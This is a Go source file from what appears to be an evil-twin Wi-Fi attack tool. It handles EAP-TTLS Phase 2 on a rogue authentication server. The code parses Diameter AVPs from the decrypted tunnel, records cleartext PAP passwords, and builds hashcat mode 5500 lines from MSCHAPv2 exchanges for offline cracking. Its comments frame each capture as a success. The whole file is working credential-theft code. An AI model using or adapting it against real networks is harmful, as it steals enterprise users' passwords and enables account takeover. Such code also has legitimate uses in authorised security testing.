package method

import (
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)

// ttlsPhase2PeekTimeout bounds the opportunistic read for front-loaded Phase-2 AVPs when the tunnel
// comes up. A TLS 1.3 supplicant sends its Finished and its first application data (the credential
// AVPs) in one flight, so they are already buffered and this returns instantly; a TLS 1.2 supplicant
// sends them in the next packet, so this times out quickly and we ACK and wait. Short, because in the
// 1.2 case it is pure added latency before the ACK.
const ttlsPhase2PeekTimeout = 400 * time.Millisecond

// EAP-TTLS Phase 2 (RFC 5281). Unlike PEAP, which tunnels inner EAP, TTLS tunnels Diameter AVPs
// carrying legacy RADIUS attributes: once the TLS tunnel is up the supplicant sends its credential
// as AVPs, and WARP reads them straight off the decrypted stream.
//
//   - PAP: a User-Name and a User-Password AVP, the password in cleartext inside the tunnel. This is
//     the most serious enterprise outcome - there is no cracking step at all.
//   - MSCHAPv2: MS-CHAP-Challenge + MS-CHAP2-Response AVPs, the same material a PEAP-MSCHAPv2 capture
//     yields, mapped onto a hashcat -m 5500 line by reusing Credential.HashcatLine.
//
// The tunnel itself is shared with PEAP/EAP-TLS (onTLSMethod); only this Phase-2 differs.

// RADIUS attribute numbers, used as Diameter AVP codes (RFC 5281 section 10, RFC 2865/2548).
const (
	avpUserName        = 1
	avpUserPassword    = 2
	avpCHAPPassword    = 3
	avpCHAPChallenge   = 60
	vendorMicrosoft    = 311 // MS-CHAP AVPs are vendor-specific (RFC 2548)
	avpMSCHAPChallenge = 11
	avpMSCHAP2Response = 25
	// mschap2ResponseLen is Ident(1) Flags(1) Peer-Challenge(16) Reserved(8) NT-Response(24).
	mschap2ResponseLen = 50
)

// avp is one decoded Diameter AVP.
type avp struct {
	vendor uint32 // 0 for a standard (non-vendor) AVP
	code   uint32
	data   []byte
}

// parseAVPs decodes the AVP list in a decrypted TTLS Phase-2 payload. Each AVP is code(4) flags(1)
// length(3) [vendor(4) when the V flag is set] data, padded to a 4-byte boundary. A malformed AVP
// stops the walk - everything read before it is kept, nothing past it is guessed at.
func parseAVPs(b []byte) []avp {
	var out []avp
	for len(b) >= 8 {
		code := binary.BigEndian.Uint32(b[0:4])
		flags := b[4]
		length := int(b[5])<<16 | int(b[6])<<8 | int(b[7])
		if length < 8 || length > len(b) {
			break
		}
		hdr := 8
		var vendor uint32
		if flags&0x80 != 0 { // V bit: vendor-specific, a 4-byte vendor id follows the header
			if length < 12 {
				break
			}
			vendor = binary.BigEndian.Uint32(b[8:12])
			hdr = 12
		}
		out = append(out, avp{vendor: vendor, code: code, data: append([]byte(nil), b[hdr:length]...)})
		padded := (length + 3) &^ 3 // advance past the AVP and its zero padding
		if padded > len(b) {
			break
		}
		b = b[padded:]
	}
	return out
}

// findAVP returns the data of the first AVP matching vendor+code, or nil.
func findAVP(avps []avp, vendor, code uint32) []byte {
	for _, a := range avps {
		if a.vendor == vendor && a.code == code {
			return a.data
		}
	}
	return nil
}

// startTTLSPhase2 is the TTLS counterpart of startInner. The server does not send an inner
// EAP-Identity - the supplicant volunteers its credential AVPs once the tunnel is up. A TLS 1.3
// supplicant sends those AVPs together with its Finished, so they may already be buffered the instant
// the handshake completes; peek for them now and, only if none are here yet (TLS 1.2), acknowledge and
// wait for the next packet. Without this peek a TLS 1.3 exchange deadlocks: the client has sent its
// credential and is waiting for our verdict while we wait for a credential that already arrived.
func (sess *Session) startTTLSPhase2(in *Packet, version uint8) (Result, error) {
	sess.State = StateTTLSPhase2
	sess.outcome.Method = TypeTTLS
	if plain, err := sess.tlsSession.ReadApplication(nil, ttlsPhase2PeekTimeout); err == nil && len(plain) > 0 {
		return sess.consumeAVPs(in, plain)
	}
	return Result{Packet: Request(in.Identifier+1, in.Type, ACK(version))}, nil
}

// ttlsPhase2 reads the decrypted Phase-2 AVPs from a subsequent packet (the TLS 1.2 path, where the
// AVPs arrive after the handshake rather than with the Finished).
func (sess *Session) ttlsPhase2(in *Packet, version uint8, payload []byte) (Result, error) {
	plain, err := sess.tlsSession.ReadApplication(payload, tlsRoundTimeout)
	if err != nil {
		return Result{}, err
	}
	if len(plain) == 0 {
		return Result{Packet: Request(in.Identifier+1, in.Type, ACK(version))}, nil
	}
	return sess.consumeAVPs(in, plain)
}

// consumeAVPs parses the decrypted Phase-2 AVPs and extracts a credential.
func (sess *Session) consumeAVPs(in *Packet, plain []byte) (Result, error) {
	avps := parseAVPs(plain)
	if user := findAVP(avps, 0, avpUserName); len(user) > 0 {
		sess.outcome.InnerIdentity = string(user)
	}

	// PAP: the password is in the clear inside the tunnel (TTLS pads it to a 16-byte boundary with
	// NULs). This is the strongest outcome - no cracking step.
	if pw := findAVP(avps, 0, avpUserPassword); pw != nil {
		sess.outcome.Cleartext = string(trimTrailingNUL(pw))
		sess.outcome.Method = TypeTTLS
		sess.outcome.Note = "TTLS inner PAP: password captured in cleartext inside the tunnel, " +
			"no cracking step"
		return sess.finish(in.Identifier, StateCaptured)
	}

	// MSCHAPv2 over TTLS: the explicit MS-CHAP-Challenge + MS-CHAP2-Response AVPs give the same
	// hashcat -m 5500 line a PEAP-MSCHAPv2 capture does.
	if resp := findAVP(avps, vendorMicrosoft, avpMSCHAP2Response); resp != nil {
		chal := findAVP(avps, vendorMicrosoft, avpMSCHAPChallenge)
		if line, ok := ttlsMSCHAPv2Line(sess.outcome.InnerIdentity, chal, resp); ok {
			sess.outcome.HashLine = line
			sess.outcome.Method = TypeTTLS
			sess.outcome.Note = "TTLS inner MSCHAPv2: hashcat -m 5500"
			return sess.finish(in.Identifier, StateCaptured)
		}
		sess.outcome.Note = "TTLS inner MSCHAPv2 seen but not emittable (implicit challenge, or " +
			"malformed AVPs)"
		return sess.reject(in.Identifier, StateFailed)
	}

	if findAVP(avps, 0, avpCHAPPassword) != nil {
		sess.outcome.Note = "TTLS inner CHAP seen; WARP captures TTLS PAP (cleartext) and " +
			"MSCHAPv2 (hashcat -m 5500)"
		return sess.reject(in.Identifier, StateFailed)
	}

	sess.outcome.Note = fmt.Sprintf("TTLS Phase 2: no recognised credential AVPs (%s)", avpCodes(avps))
	return sess.reject(in.Identifier, StateFailed)
}

// ttlsMSCHAPv2Line builds a hashcat -m 5500 line from the TTLS MS-CHAP AVPs. MS-CHAP-Challenge is the
// 16-byte authenticator challenge; MS-CHAP2-Response is Ident(1) Flags(1) Peer-Challenge(16)
// Reserved(8) NT-Response(24). It reuses Credential.HashcatLine so the derived-challenge maths is
// identical to the PEAP path (the single most important thing to get right - see ChallengeHash).
func ttlsMSCHAPv2Line(username string, challenge, response []byte) (string, bool) {
	if username == "" || len(challenge) != AuthenticatorChallengeLen || len(response) != mschap2ResponseLen {
		return "", false
	}
	var cred Credential
	cred.Username = username
	copy(cred.AuthenticatorChallenge[:], challenge)
	copy(cred.PeerChallenge[:], response[2:18])
	copy(cred.NTResponse[:], response[26:50])
	line, err := cred.HashcatLine()
	if err != nil {
		return "", false
	}
	return line, true
}

func trimTrailingNUL(b []byte) []byte {
	for len(b) > 0 && b[len(b)-1] == 0 {
		b = b[:len(b)-1]
	}
	return b
}

// avpCodes lists the AVP codes seen, for the "no recognised credential" diagnostic.
func avpCodes(avps []avp) string {
	if len(avps) == 0 {
		return "none"
	}
	parts := make([]string, 0, len(avps))
	for _, a := range avps {
		if a.vendor != 0 {
			parts = append(parts, fmt.Sprintf("v%d:%d", a.vendor, a.code))
		} else {
			parts = append(parts, fmt.Sprintf("%d", a.code))
		}
	}
	return strings.Join(parts, ",")
}
